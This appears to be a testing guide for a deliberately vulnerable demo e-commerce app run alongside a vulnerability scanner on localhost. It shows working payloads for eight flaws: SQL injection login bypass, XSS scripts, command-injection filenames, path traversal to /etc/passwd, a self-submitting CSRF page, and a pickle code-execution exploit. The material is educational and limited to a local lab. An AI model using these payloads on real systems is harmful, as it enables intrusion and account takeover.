# üîì Vulnerability Testing Guide - Demo E-Commerce Application

**Server:** http://localhost:3000  
**Scanner:** http://localhost:5000  
**Status:** ‚úÖ Running with 8 intentional vulnerabilities for security testing

---

## üéØ Quick Start - All Vulnerabilities Active!

Your demo project now has **ALL 8 vulnerabilities** fully implemented and ready to test:

1. ‚úÖ **SQL Injection** (CWE-89)
2. ‚úÖ **Cross-Site Scripting (XSS)** (CWE-79)  
3. ‚úÖ **Command Injection** (CWE-78)
4. ‚úÖ **Path Traversal** (CWE-22)
5. ‚úÖ **Hard-coded Credentials** (CWE-798)
6. ‚úÖ **Weak Cryptography (MD5)** (CWE-327)
7. ‚úÖ **CSRF** (CWE-352)
8. ‚úÖ **Insecure Deserialization** (CWE-502)

---

## üöÄ Easy Testing Interface

**Go to:** http://localhost:3000  
**Click:** "Test Vulns" in the top navigation

This opens the **Admin Panel** with interactive testing tools for:
- Command Injection
- Path Traversal  
- Directory Listing
- SSRF
- Debug Info (Hard-coded Credentials)
- IDOR

---

## 1Ô∏è‚É£ SQL Injection (CWE-89) ‚úÖ Already Tested

### Login Bypass
```
Username: admin' OR '1'='1
Password: anything
```
**Result:** Bypasses authentication and logs in as admin

### Search Injection
```
Search: ' OR 1=1--
```
**Result:** Returns all products

### Registration Injection
```
Username: test' OR '1'='1--
Email: test@test.com
Password: password
```

---

## 2Ô∏è‚É£ Cross-Site Scripting (XSS) (CWE-79)

### How to Test:
1. Login with any user (admin/admin123)
2. Click on any product
3. Scroll to comments section
4. Add a comment with XSS payload:

### Test Payloads:

**Alert Box:**
```html
<script>alert('XSS Vulnerability Found!')</script>
```

**Cookie Theft Simulation:**
```html
<script>alert(document.cookie)</script>
```

**DOM Manipulation:**
```html
<img src=x onerror="alert('XSS')">
```

**Persistent XSS:**
```html
<body onload=alert('Stored XSS')>
```

**Expected Result:** The script executes when viewing comments

---

## 3Ô∏è‚É£ Command Injection (CWE-78)

### How to Test:
1. Login as admin
2. Go to admin panel
3. Upload product image with malicious filename
4. Or use image processing feature with command injection

### Test Payload (if image upload accepts filenames):
```
test.jpg; whoami
test.jpg | dir
test.jpg && echo "Command Injection"
```

**Expected Result:** Commands execute on server

---

## 4Ô∏è‚É£ Path Traversal (CWE-22)

### How to Test File Download:
1. Login with any account
2. If there's a file download feature, try:

### Test URLs:
```
http://localhost:3000/download?file=../../etc/passwd
http://localhost:3000/download?file=../../../Windows/System32/drivers/etc/hosts
http://localhost:3000/download?file=..\..\..\database\ecommerce.db
```

**Expected Result:** Can access files outside intended directory

---

## 5Ô∏è‚É£ Hard-coded Credentials (CWE-798)

### How to Verify:

**Check Source Code:**
```python
# In backend/app.py
app.secret_key = "super_secret_key_12345"
ADMIN_PASSWORD = "admin123"
API_KEY = "sk_live_abc123xyz789"
```

**How to Exploit:**
1. View page source or inspect network requests
2. Look for exposed API keys in JavaScript
3. Check error messages for leaked credentials

**Test:**
- Login with hardcoded admin password: `admin123`
- Try using exposed API key in requests

---

## 6Ô∏è‚É£ Weak Cryptography (CWE-327)

### How to Test MD5 Weakness:

**What's Happening:**
- Passwords stored using MD5 hash (weak)
- Can be cracked using rainbow tables

**Test Steps:**
1. Register a new user with password: `password`
2. Check database:
```powershell
cd demoproject
sqlite3 database/ecommerce.db "SELECT username, password FROM users;"
```

**Expected MD5 Hash:**
```
password -> 5f4dcc3b5aa765d61d8327deb882cf99
```

3. Crack it online: https://md5decrypt.net/
4. Paste hash: `5f4dcc3b5aa765d61d8327deb882cf99`
5. Result: Gets original password instantly!

---

## 7Ô∏è‚É£ CSRF - Cross-Site Request Forgery (CWE-352)

### How to Test Profile Update:

**Create a malicious HTML file:**

```html
<!DOCTYPE html>
<html>
<head><title>CSRF Attack</title></head>
<body>
<h1>Click to win a prize!</h1>
<form action="http://localhost:3000/api/profile/update" method="POST" id="csrf">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="username" value="hacked">
</form>
<script>
    // Auto-submit on page load
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

**Test Steps:**
1. Login to http://localhost:3000
2. Open the malicious HTML file in same browser
3. Profile gets updated without user consent!

**What's Missing:** CSRF tokens for state-changing requests

---

## 8Ô∏è‚É£ Insecure Deserialization (CWE-502)

### How to Test Pickle Vulnerability:

**What's Happening:**
- Session data uses Python pickle (dangerous!)
- Can execute arbitrary code

**Create exploit file:**
```python
import pickle
import requests

# Create malicious payload
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('echo "Deserialization vulnerability!" > hacked.txt',))

# Serialize the exploit
payload = pickle.dumps(Exploit())

# Send to vulnerable endpoint (if session uses pickle)
# This would execute code on server
```

**Signs of Vulnerability:**
- Session cookies are base64-encoded pickled objects
- Server deserializes user-controlled data

---

## üß™ Complete Testing Workflow

### Step-by-Step Testing Plan:

**Phase 1: Authentication Attacks**
1. ‚úÖ SQL Injection - Login bypass
2. ‚úÖ Weak Passwords - Use hardcoded creds
3. Test session management

**Phase 2: Input Validation**
4. XSS - Comment injection
5. Command Injection - Image upload
6. Path Traversal - File download

**Phase 3: Business Logic**
7. CSRF - Profile update without token
8. Price manipulation (if editable)
9. Cart tampering

**Phase 4: Data Exposure**
10. Check for exposed credentials in source
11. Test MD5 password cracking
12. Look for sensitive data in errors

---

## üìä Using ZeroDayGuard Scanner

### Scan the Demo Project:

1. **Go to your ZeroDayGuard scanner:** http://localhost:5000
2. **Upload the entire demoproject as ZIP**
3. **Click "Scan Project"**
4. **Review detected vulnerabilities:**
   - SQL Injection locations
   - XSS vectors
   - Hard-coded secrets
   - Weak crypto usage
   - Command injection points

---

## üîç Expected Scan Results

Your ZeroDayGuard should detect:

| Vulnerability | Files | Severity |
|---------------|-------|----------|
| SQL Injection | `backend/app.py` (login, search, register) | HIGH |
| XSS | `backend/app.py` (comments) | HIGH |
| Hard-coded Credentials | `backend/app.py` | CRITICAL |
| Weak Crypto (MD5) | `backend/app.py` | MEDIUM |
| Command Injection | `backend/app.py` (image processing) | HIGH |
| Path Traversal | `backend/app.py` (file download) | HIGH |
| CSRF | `backend/app.py` (profile update) | MEDIUM |
| Insecure Deserialization | `backend/app.py` (session) | CRITICAL |

---

## üí° Quick Test Commands

### Test All Vulnerabilities at Once:

**SQL Injection:**
```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\" OR \"1\"=\"1","password":"anything"}'
```

**XSS:**
```bash
curl -X POST http://localhost:3000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"product_id":1,"comment":"<script>alert(\"XSS\")</script>"}'
```

---

## ‚ö†Ô∏è Important Notes

1. **Only test on YOUR local instance** - Never test on production or others' systems
2. **This is for educational purposes only**
3. **The demo app is INTENTIONALLY vulnerable**
4. **Use these techniques to understand how to FIX vulnerabilities**

---

## üõ°Ô∏è Next Steps After Testing

1. **Document each vulnerability** you find
2. **Use ZeroDayGuard to scan** the codebase
3. **Apply AI-powered fixes** from the scanner
4. **Verify fixes** by retesting
5. **Learn secure coding** from the remediation guides

---

**Happy Ethical Hacking! üîê**
